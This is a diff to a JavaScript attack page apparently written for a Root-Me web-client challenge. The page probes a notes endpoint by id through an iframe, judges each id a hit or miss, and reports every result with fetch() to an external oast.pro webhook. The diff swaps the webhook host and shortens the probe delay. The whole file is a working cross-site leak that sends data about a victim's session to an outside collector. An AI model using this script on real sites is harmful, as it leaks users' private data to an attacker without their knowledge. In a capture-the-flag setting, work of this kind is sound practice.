@@ -1,6 +1,6 @@
 <script>
 const TARGET = "https://web-client-ch56.challenge01.root-me.org:58056/notes/";
-const WEBHOOK = "https://85531c6a18bfcfaeb4aegux4iseyyyyyb.oast.pro";
+const WEBHOOK = "https://525146614d396f3af709gux4rbeyyyyyb.oast.pro";
 let id = parseInt(new URLSearchParams(window.location.search).get('id'), 10) || 1;
 
 function next() {
@@ -18,9 +18,8 @@ function next() {
         fetch(WEBHOOK + "?result=" + (hit ? "hit" : "miss") + "&id=" + id);
         iframe.style.display = "none";
         id++;
+        setTimeout(next, 500);
     }
-
-    setTimeout(next, 2000);
 }
 
 next();
